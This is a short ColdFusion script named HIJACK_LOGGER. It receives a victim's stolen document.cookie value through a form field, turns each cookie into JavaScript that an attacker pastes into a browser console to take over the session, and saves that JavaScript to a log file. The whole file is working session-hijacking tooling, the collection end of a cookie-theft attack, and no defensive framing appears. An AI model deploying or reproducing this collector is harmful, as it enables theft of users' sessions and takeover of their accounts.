<cfscript>
  /*
  HIJACK_LOGGER (ColdFusion version)
  
  Expects a form field named 'c' that is just document.cookie from the session to be hijacked.
  Generates some javascript code that can be run on the attacker's browser to hijack the session.
  The generated Javascript is stored in hijack_log.txt file in the same directory as this script.
  */
  
  script = '';
  
  //generate javascript that can be copied & pasted to console
  for(i = 1; i <= ListLen(Form.c, ';'); i++) {
    myCookie = trim(ListGetAt(form.c, i, ';'));
    script &= "document.cookie = '#myCookie#; expires=Wed, 1 Jan 2020 00:00:00 UTC; path=/';#Chr(13)##Chr(10)#";
  }
  
  FileWrite("#GetDirectoryFromPath(GetCurrentTemplatePath())#/hijack_log.txt", script);
</cfscript>
